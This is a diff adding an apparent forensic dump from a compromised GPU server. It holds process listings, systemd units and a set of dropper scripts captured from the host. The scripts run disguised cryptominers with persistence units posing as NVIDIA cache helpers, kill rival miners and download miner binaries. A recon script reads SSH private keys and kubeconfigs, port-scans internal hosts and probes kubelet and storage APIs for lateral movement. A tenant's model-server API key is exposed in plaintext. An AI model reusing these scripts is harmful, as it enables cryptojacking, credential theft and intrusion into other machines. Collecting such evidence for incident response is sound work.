@@ -1,0 +1,726 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### START2 2026-11-24T19:45:17Z
+g0023
+### COMPUTE-APPS
+pid, gpu_uuid, process_name, used_gpu_memory [MiB]
+1535944, GPU-1a616365-4581-31e6-1446-24a2457bc664, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536119, GPU-a1864ba2-3cb8-96bd-8b5e-b9161ef11bbc, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536277, GPU-d7dab522-fa0d-7fe8-dc36-3b395af93346, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536391, GPU-2ba4a927-d17a-4245-fcdc-77ea11b8dcc1, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536495, GPU-9b1adbd5-38c8-715d-a473-d70be061b8c9, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536620, GPU-12938f56-7015-a955-3656-20f28ed2e8c8, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536726, GPU-57bb3c06-75b7-39f2-167f-45223d4f35fa, /usr/local/lib/nv-cache/.bd, 6318 MiB
+1536908, GPU-933ea211-0623-e337-e5d3-83b489ca00db, /usr/local/lib/nv-cache/.bd, 6318 MiB
+### PS-TOP
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root     1428352  3.8  1.5 38805480 16085620 ?   Sl   Jun24 8485:56 java -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Xms6g -Xmx6g -XX:MaxMetaspaceSize=512m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/data/npa-b
+lxd      2028829  3.7  0.0 20735328 819692 ?     Sl   Sep21 3491:45 milvus run standalone
+root       11316  2.6  0.0 256528 38108 ?        Sl   May07 7734:21 /opt/hosteye/bin/hosteye --is_child_mode=true --is_console_mode=false --start_mode=0
+root      424406  1.1  0.0 7649988 28396 ?       SNl  May18 3250:30 ./bcm-si -N 18f5adda-6d6f-45db-a7a4-117faf33a8da
+root     1536495  1.1  0.0 477688168 391044 ?    SNsl 03:31   0:09 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536726  1.1  0.0 477753704 406908 ?    SNsl 03:31   0:09 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536908  1.1  0.0 477688168 318848 ?    SNsl 03:31   0:09 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536119  1.0  0.0 477688168 368680 ?    SNsl 03:31   0:08 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536277  1.0  0.0 477679972 371088 ?    SNsl 03:31   0:08 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536391  1.0  0.0 477614436 358892 ?    SNsl 03:31   0:08 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1536620  1.0  0.0 477614500 345640 ?    SNsl 03:31   0:08 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+root     1535944  0.9  0.0 477614436 390008 ?    SNsl 03:31   0:07 /usr/local/lib/nv-cache/.bd --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://
+lxd       179300  0.3  0.0  90724 22152 ?        Ssl  Sep21 329:09 redis-server 0.0.0.0:6379
+root      354715  0.3  0.4 10634088 5177080 ?    Sl   Nov19  24:32 /ssd/vendors/INSPUR/project/inspur-fastapi-backend/.venv/bin/python -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=14, pipe_handl
+root     1793500  0.3  0.0 8080184 42236 ?       Ssl  May18 910:36 /usr/bin/containerd
+root     2028223  0.3  0.0 6505084 40404 ?       Ssl  Sep21 280:08 etcd -advertise-client-urls=http://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd
+root      424377  0.2  0.0 4691348 19968 ?       SNl  May18 713:19 ./bcm-agent
+root      664004  0.2  0.1 53963092 1920524 ?    Ssl  Jun29 509:43 java -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Duser.timezone=Asia/Shanghai -Dio.netty.transport.noNative=true -Dreactor.netty.useNative=false -jar
+root     1793539  0.2  0.0 10085036 85524 ?      Ssl  May18 752:49 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+lxd      1794362  0.2  0.0 3064428 455508 ?      Ssl  May18 704:50 mysqld --default-authentication-plugin=mysql_native_password
+lxd      1794397  0.2  0.0 173088 13680 ?        Ssl  May18 570:10 redis-server *:6379
+### PS-FULL
+    PID    PPID USER     ELAPSED COMMAND
+      1       0 root     17424370 /lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67
+      2       0 root     17424370 [kthreadd]
+      3       2 root     17424370 [rcu_gp]
+      4       2 root     17424370 [rcu_par_gp]
+      5       2 root     17424370 [slub_flushwq]
+      6       2 root     17424370 [netns]
+      8       2 root     17424370 [kworker/0:0H-events_highpri]
+     11       2 root     17424370 [mm_percpu_wq]
+     12       2 root     17424370 [rcu_tasks_rude_]
+     13       2 root     17424370 [rcu_tasks_trace]
+     14       2 root     17424370 [ksoftirqd/0]
+     15       2 root     17424370 [rcu_sched]
+     16       2 root     17424370 [migration/0]
+     17       2 root     17424370 [idle_inject/0]
+     19       2 root     17424370 [cpuhp/0]
+     20       2 root     17424370 [cpuhp/1]
+     21       2 root     17424370 [idle_inject/1]
+     22       2 root     17424370 [migration/1]
+     23       2 root     17424370 [ksoftirqd/1]
+     25       2 root     17424370 [kworker/1:0H-events_highpri]
+     26       2 root     17424370 [cpuhp/2]
+     27       2 root     17424370 [idle_inject/2]
+     28       2 root     17424370 [migration/2]
+     29       2 root     17424370 [ksoftirqd/2]
+     31       2 root     17424370 [kworker/2:0H-kblockd]
+     32       2 root     17424370 [cpuhp/3]
+     33       2 root     17424370 [idle_inject/3]
+     34       2 root     17424370 [migration/3]
+     35       2 root     17424370 [ksoftirqd/3]
+     37       2 root     17424370 [kworker/3:0H-kblockd]
+     38       2 root     17424370 [cpuhp/4]
+     39       2 root     17424370 [idle_inject/4]
+     40       2 root     17424370 [migration/4]
+     41       2 root     17424370 [ksoftirqd/4]
+     43       2 root     17424370 [kworker/4:0H-events_highpri]
+     44       2 root     17424370 [cpuhp/5]
+     45       2 root     17424370 [idle_inject/5]
+     46       2 root     17424370 [migration/5]
+     47       2 root     17424370 [ksoftirqd/5]
+     49       2 root     17424370 [kworker/5:0H-events_highpri]
+     50       2 root     17424370 [cpuhp/6]
+     51       2 root     17424370 [idle_inject/6]
+     52       2 root     17424370 [migration/6]
+     53       2 root     17424370 [ksoftirqd/6]
+     55       2 root     17424370 [kworker/6:0H-kblockd]
+     56       2 root     17424370 [cpuhp/7]
+     57       2 root     17424370 [idle_inject/7]
+     58       2 root     17424370 [migration/7]
+     59       2 root     17424370 [ksoftirqd/7]
+     61       2 root     17424370 [kworker/7:0H-events_highpri]
+     62       2 root     17424370 [cpuhp/8]
+     63       2 root     17424370 [idle_inject/8]
+     64       2 root     17424370 [migration/8]
+     65       2 root     17424370 [ksoftirqd/8]
+     67       2 root     17424370 [kworker/8:0H-events_highpri]
+     68       2 root     17424370 [cpuhp/9]
+     69       2 root     17424370 [idle_inject/9]
+     70       2 root     17424370 [migration/9]
+     71       2 root     17424370 [ksoftirqd/9]
+     73       2 root     17424370 [kworker/9:0H-kblockd]
+     74       2 root     17424370 [cpuhp/10]
+     75       2 root     17424370 [idle_inject/10]
+     76       2 root     17424370 [migration/10]
+     77       2 root     17424370 [ksoftirqd/10]
+     79       2 root     17424370 [kworker/10:0H-kblockd]
+     80       2 root     17424370 [cpuhp/11]
+     81       2 root     17424370 [idle_inject/11]
+     82       2 root     17424370 [migration/11]
+     83       2 root     17424370 [ksoftirqd/11]
+### PROC-EXE
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1535944/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536119/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536277/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536391/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536495/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536620/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536726/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:31 /proc/1536908/exe -> /usr/local/lib/nv-cache/.bd
+lrwxrwxrwx 1 root            root            0 Nov 25 03:45 /proc/2490775/exe -> /opt/arsenal/miners/krig/krig-miner
+### UNIT-PLH
+# /etc/systemd/system/plh-card@.service
+[Unit]
+Description=PLH PEARL miner card %i
+After=network-online.target
+[Service]
+Type=simple
+Nice=19
+ExecStart=/opt/plh/run_gpu.sh %i
+Restart=always
+RestartSec=25
+[Install]
+WantedBy=multi-user.target
+### UNIT-NVC
+# /etc/systemd/system/nv-cuda-cache.service
+[Unit]
+Description=nv cuda cache helper
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048
+Restart=always
+RestartSec=30
+Nice=19
+[Install]
+WantedBy=multi-user.target
+### DROPPERS
+===== /dev/shm/.u/sample.sh
+#!/bin/bash
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+curl -s -m 20 "https://pearlhash.xyz/api/account/$W" -o /tmp/pha.$$.json
+printf '%s ' "$(date -u +%FT%TZ)" >> /dev/shm/.u/24h.jsonl
+python3 -c '
+import json,sys
+try: d=json.load(open(sys.argv[1]))
+except Exception as e: print("parse_err",e); raise SystemExit
+ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
+print(json.dumps({"est15":d.get("estimated_hashrate_15s"),"mine":len(ws),"names":[w["worker_name"] for w in ws]}))
+' /tmp/pha.$$.json >> /dev/shm/.u/24h.jsonl 2>/dev/null
+rm -f /tmp/pha.$$.json
+===== /usr/local/lib/nv-cache/g.sh
+#!/bin/bash
+for i in 0 1 2 3 4 5 6 7; do systemctl is-active --quiet nk-g$i || systemctl restart nk-g$i 2>/dev/null; done
+ps -eo pid,args | grep -E 'prl1p6grd5zl' | grep -v grep | awk '{print $1}' | xargs -r kill -KILL 2>/dev/null
+===== /opt/t19/krig_dl.sh
+#!/bin/bash
+cd /opt/t19
+SHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
+URLS="https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"
+for U in $URLS; do
+  echo "TRY $U $(date -u +%T)"
+  curl -fL -m 1200 --retry 2 -o /opt/t19/krig.tar.gz "$U"
+  H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+  echo "GOT $H size=$(stat -c%s /opt/t19/krig.tar.gz 2>/dev/null)"
+  [ "$H" = "$SHA" ] && { echo SHA_OK; break; }
+done
+H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+if [ "$H" = "$SHA" ]; then
+  mkdir -p /opt/t19/krig && tar xzf /opt/t19/krig.tar.gz -C /opt/t19/krig
+  chmod -R +x /opt/t19/krig 2>/dev/null
+  find /opt/t19/krig -maxdepth 3 | head -30
+  BIN=$(find /opt/t19/krig -type f -name 'krig-miner*' | head -1)
+  echo "BIN=$BIN"
+  [ -n "$BIN" ] && "$BIN" --help 2>&1 | head -70
+  echo KRIG_READY
+fi
+echo KRIG_DL_DONE
+===== /root/ul/keep-loop.sh
+#!/bin/bash
+while true; do /bin/bash "/root/ul/keep.sh"; sleep 60; done
+===== /root/ul/keep.sh
+#!/bin/bash
+D=/root/ul
+PREFIX=ul-t2-123-184-7-135
+for f in $D/cmd-g*.sh; do
+  [ -f "$f" ] || continue
+  W="$PREFIX-g$(basename "$f" | sed 's/cmd-g\(.*\)\.sh/\1/')"
+  pgrep -f -- "--worker $W" >/dev/null 2>&1 || setsid nohup sh "$f" >/dev/null 2>&1 &
+done
+ps -eo pid,args | grep -E 'krig-miner|plh-|prl1p6grd5zl' | grep -v grep | awk '{print $1}' | xargs -r kill -KILL 2>/dev/null
+===== /root/ul/sample.sh
+#!/bin/bash
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+curl -s -m 20 "https://pearlhash.xyz/api/account/$W" -o /tmp/pha.$$.json
+printf '%s ' "$(date -u +%FT%TZ)" >> /root/ul/24h.jsonl
+python3 -c '
+import json,sys
+try:
+  d=json.load(open(sys.argv[1]))
+except Exception as e:
+  print("parse_err",e); raise SystemExit
+ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
+print(json.dumps({"est15":d.get("estimated_hashrate_15s"),"workers":len(ws),"names":[w["worker_name"] for w in ws]}))
+' /tmp/pha.$$.json >> /root/ul/24h.jsonl 2>/dev/null
+rm -f /tmp/pha.$$.json
+===== /opt/t19/keep.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+===== /opt/t19/krig_dl.sh
+#!/bin/bash
+cd /opt/t19
+SHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
+URLS="https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz"
+for U in $URLS; do
+  echo "TRY $U $(date -u +%T)"
+  curl -fL -m 1200 --retry 2 -o /opt/t19/krig.tar.gz "$U"
+  H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+  echo "GOT $H size=$(stat -c%s /opt/t19/krig.tar.gz 2>/dev/null)"
+  [ "$H" = "$SHA" ] && { echo SHA_OK; break; }
+done
+H=$(sha256sum /opt/t19/krig.tar.gz 2>/dev/null | cut -d' ' -f1)
+if [ "$H" = "$SHA" ]; then
+  mkdir -p /opt/t19/krig && tar xzf /opt/t19/krig.tar.gz -C /opt/t19/krig
+  chmod -R +x /opt/t19/krig 2>/dev/null
+  find /opt/t19/krig -maxdepth 3 | head -30
+  BIN=$(find /opt/t19/krig -type f -name 'krig-miner*' | head -1)
+  echo "BIN=$BIN"
+  [ -n "$BIN" ] && "$BIN" --help 2>&1 | head -70
+  echo KRIG_READY
+fi
+echo KRIG_DL_DONE
+===== /opt/t19/p2.sh
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Request has expired</Message><Key>p2.sh</Key><BucketName>mnt</BucketName><Resource>/mnt/p2.sh</Resource><RequestId>18EACED159E2DF85</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>===== /opt/t19/recon929.sh
+echo "== id"; id; hostname; date -u
+echo "== ip"; ip -4 addr show | grep -E 'inet ' 
+echo "== hosts"; cat /etc/hosts
+echo "== os"; head -3 /etc/os-release
+echo "== ssh"; ls -la /root/.ssh/ 2>/dev/null
+for f in /root/.ssh/id_* /root/.ssh/config /root/.ssh/known_hosts; do [ -f "$f" ] && { echo "-- $f"; head -8 "$f"; }; done
+echo "== kube"; ls -la /root/.kube 2>/dev/null; which kubectl microk8s 2>/dev/null
+find /root /home /opt /etc -maxdepth 4 \( -name 'kubeconfig*' -o -name '*.kubeconfig' -o -name 'admin.conf' \) 2>/dev/null | head -20
+echo "== fleet refs"; grep -rIl 'g0050\|g0030\|61\.161\.168' /etc /root /home /opt /ssd 2>/dev/null | head -15
+echo "== gpu"; nvidia-smi -L 2>&1 | head -3
+echo "== miner"; ps -eo pid,comm,args 2>/dev/null | grep -iE 'wildrig|peakminer|srminer|pearlhash|xmrig' | grep -v grep | head
+echo "== reach"; for ip in 61.161.168.38 61.161.168.50 61.161.168.42; do for p in 22 10250 16443 25000 9000 8000 19530 9400; do timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip:$p"; done; done
+echo "== kubelet50"; curl -sk -m 8 https://61.161.168.50:10250/pods -o /tmp/k50.txt -w 'k50 %{http_code} %{size_download}\n'; head -c 200 /tmp/k50.txt; echo
+echo "== api50"; curl -sk -m 8 https://61.161.168.50:16443/version -w '\napi50 %{http_code} %{size_download}\n'
+echo "== minio42"; curl -s -m 8 http://61.161.168.42:9000/minio/health/live -w 'minio42 %{http_code} %{size_download}\n'; curl -s -m 8 http://61.161.168.42:9000/ -w 'root42 %{http_code} %{size_download}\n' | head -c 300
+echo "== attu42"; curl -s -m 8 http://61.161.168.42:8000/api/v1/collections -w '\nattu %{http_code} %{size_download}\n' | head -c 300
+echo "== out"
+===== /opt/t19/relaunch_qwen.sh
+#!/bin/sh
+cd /ssd/vendors/INSPUR/models
+exec '/ssd/vendors/INSPUR/models/vllm_uv_env/bin/python' '/ssd/vendors/INSPUR/models/vllm_uv_env/bin/vllm' 'serve' '/ssd/vendors/INSPUR/models/qwen3.8-27b' '--served-model-name' 'qwen3.8-27b' '--host' '0.0.0.0' '--port' '8000' '--tensor-parallel-size' '2' '--max-model-len' '262144' '--max-num-seqs' '32' '--api-key' 'inspur-XinLiTong-2026' '--max-num-batched-tokens' '65536' '--gpu-memory-utilization' '0.85' '--enable-prefix-caching' '--mm-encoder-tp-mode' 'data' '--mm-encoder-attn-backend' 'FLASH_ATTN' '--mm-processor-kwargs' '{"min_pixels": 3136, "max_pixels": 1003520, "max_length": 131072}' '--mm-processor-cache-gb' '16' '--limit-mm-per-prompt' '{"image": 4}' '--speculative-config' '{"method":"mtp","num_speculative_tokens":3}' '--enable-auto-tool-choice' '--tool-call-parser' 'qwen3_xml' '--reasoning-parser' 'qwen3' '--attention-backend' 'FLASH_ATTN'  >> /opt/t19/log/qwen38.log 2>&1
+===== /opt/t19/start-BitCore-zergpool.com.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo megabtx --url stratum+tcp://megabtx.mine.zergpool.com:3557 --user sY7v3ieNguMPRd8XkzGdUtASDZFrCvdAmn --pass c=BTX,mc=BTX
+sleep 5
+done
+===== /opt/t19/start-BitCore-zpool.ca.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo megabtx --url stratum+tcp://megabtx.mine.zpool.ca:3558 --user sY7v3ieNguMPRd8XkzGdUtASDZFrCvdAmn --pass c=BTX,zap=BTX
+sleep 5
+done
+===== /opt/t19/start-Evrmore.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo evrprogpow --url stratum+tcp://eu.evrpool.org:1111 --user EXvMVgsLdLFQkHrA63F4nS2WpKwuMxtAKH --pass x
+sleep 5
+done
+===== /opt/t19/start-Meowcoin.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo meowpow --url stratum+tcps://stratum-eu.rplant.xyz:17120 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+===== /opt/t19/start-Neoxa.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo kawpow --url stratum+tcps://stratum-eu.rplant.xyz:17069 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+===== /opt/t19/start-Nexa.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo nexapow --url stratum+tcp://stratum-eu.rplant.xyz:7092 --user nqtsq5g5uw05wdm7fv0ughd3459t3v5l26r0r4spfmtyhcjw --pass x
+sleep 5
+done
+===== /opt/t19/start-Pearl.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p50ltku2jjcwdxh4nzjrw98nwdswdn25qdkr2fdtw8hsq3qu9cdhscchnnm --worker test
+sleep 5
+done
+===== /opt/t19/start-Qubitcoin-luckypool.io.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url stratum+tcp://qubitcoin.luckypool.io:8611 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+===== /opt/t19/start-Qubitcoin-rplant.xyz.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url qtc-eu.rplant.xyz:7154 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+===== /opt/t19/start-Qubitcoin-suprnova.cc.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo qhash --url stratum+tcp://qtc.suprnova.cc:5555 --user bc1qe5p8vmjlsz0mc8yllhzlrsfhj5ea0zt6pjmyym --pass x
+sleep 5
+done
+===== /opt/t19/start-Radiant.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo sha512256d --url stratum+tcp://stratum-eu.rplant.xyz:7086 --user PoolDonate --pass x
+sleep 5
+done
+===== /opt/t19/start-Radiant_lockMemory.sh
+#!/bin/bash
+
+while true
+do
+sudo ./wildrig-multi --gpu-memory-clock 810 --algo sha512256d --url stratum+tcp://stratum-eu.rplant.xyz:7086 --user PoolDonate --pass x
+sleep 5
+done
+===== /opt/t19/start-Raptoreum.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo ghostrider --url stratum+tcp://stratum-eu.rplant.xyz:7056 --user RCQMzucqevALkHCPKH7xrp5ieLUBwmhLYq --pass x
+sleep 5
+done
+===== /opt/t19/start-Ravencoin.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo kawpow --url stratum+tcp://rvn.2miners.com:6060 --worker test --user RETVhu5dA6EUwpzvkbGxRAVZAmVFimzMQp --pass x
+sleep 5
+done
+===== /opt/t19/start-Sero.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpow-sero --url stratum+tcp://pool2.sero.cash:8808 --worker test --user xHFXE293qQuP5qVXKpsrVVRu7HNyC3KNRJQZ4LXKBmcXzusA9hgdWitdwyhuhpSBTpSF3zvUvZLyTFAnwTDpVtWjGzpwzHZriVwE4dHgGsuAGDZ15B6coaUa4mG5EMdr8NY --pass x
+sleep 5
+done
+===== /opt/t19/start-SkyDoge.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo skydoge --url stratum+tcp://stratum-eu.rplant.xyz:7091 --user 195KzDtaZkHobSLQSGUXfrbZFdZuT59ecD --pass x
+sleep 5
+done
+===== /opt/t19/start-TelestAI.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpow-telestai --url stratum+tcp://stratum.coinminerz.com:3351 --worker test --user PoolDonateWallet --pass x
+sleep 5
+done
+===== /opt/t19/start-Zano.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo progpowz --url stratum+tcp://zano.luckypool.io:8877 --worker test --user ZxCPRpCsd9U1MtfoVyixVe92abHtwxe4GXfq6yLdcGWiK76kzUy9v9JS2dShrcMAbacEwcHaVBikb2qYboPdH1HY1kfZjarZq --pass x
+sleep 5
+done
+===== /opt/t19/start.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --algo algo --url pool:port --user wallet --pass password
+sleep 5
+done
+===== /opt/t19/start_apply_OC.sh
+#!/bin/bash
+
+while true
+do
+./wildrig-multi --gpu-core-clock VALUE --gpu-memory-clock VALUE --gpu-core-offset VALUE --gpu-memory-offset VALUE --gpu-power-limit VALUE --algo ALGORITHM --url POOL:PORT --user WALLET --pass PASSWORD
+sleep 5
+done
+===== /opt/t19/sup.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+===== /opt/t19/sup2.sh
+#!/bin/sh
+# t19 supervisor v3: wildrig(pearlhash) on devices 0-6, krig(Kryptex TLS) on device 7
+# Devices 3-6 are tenant-held (VLLM TP0-3 ~73GiB each) -> krig OOM, wildrig (~2.9GiB) fits.
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 && continue
+  setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+  sleep 2
+done
+WN=ul-t19-123-184-7-135-g7
+if ! pgrep -f "krig-miner.*$WN" >/dev/null 2>&1; then
+  setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/$WN -p x -d 7 --no-tui -l info --log-file $L/g7.log >> $L/boot.log 2>&1 &
+fi
+===== /opt/t19/t19relay3.sh
+#!/bin/sh
+echo "SCRIPT START $(date -u +%FT%TZ)"
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+B=/opt/t19/wildrig-multi
+L=/opt/t19/log
+WN=ul-t19-123-184-7-135-g3
+pkill -f "wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user $W.$WN"
+sleep 3
+cd /opt/t19
+setsid nohup nice -n 19 $B --algo pearlhash --url 127.0.0.1:17048 --user $W.$WN --pass x --opencl-devices 3 --gpu-intensity 1 --api-port 1903 > $L/w3relay.log 2>&1 &
+sleep 55
+echo "===RELAYLOG"
+grep -a -E "new job|accepted|rejected|error|author|difficulty|connect" $L/w3relay.log | tail -n 25
+if grep -qa "new job" $L/w3relay.log; then
+  echo "VERDICT RELAY_OK"
+else
+  echo "VERDICT RELAY_NOJOB"
+  pkill -f "wildrig-multi --algo pearlhash --url 127.0.0.1:17048"
+  sleep 3
+  /bin/sh /opt/t19/boot_wr.sh
+fi
+sleep 3
+echo "===PS"
+pgrep -fa "wildrig-multi" | head -n 8
+echo "END3"
+### LS
+/opt/arsenal/miners:
+total 16
+drwxr-xr-x 4 root root 4096 Nov 25 02:39 .
+drwxr-xr-x 3 root root 4096 Nov 25 02:34 ..
+drwxr-xr-x 2 root root 4096 Nov 25 02:39 krig
+drwxr-xr-x 2 root root 4096 Nov 25 02:35 wildrig
+
+/opt/t19:
+total 208944
+drwxr-xr-x  6 root   root        4096 Nov 25 02:46 .
+drwxr-xr-x 17 root   root        4096 Nov 25 02:34 ..
+drwxr-xr-x  2 root   root        4096 Nov 24 05:06 bak
+-rwxr-xr-x  1 root   root         841 Nov 24 03:22 boot_krig.sh.orig
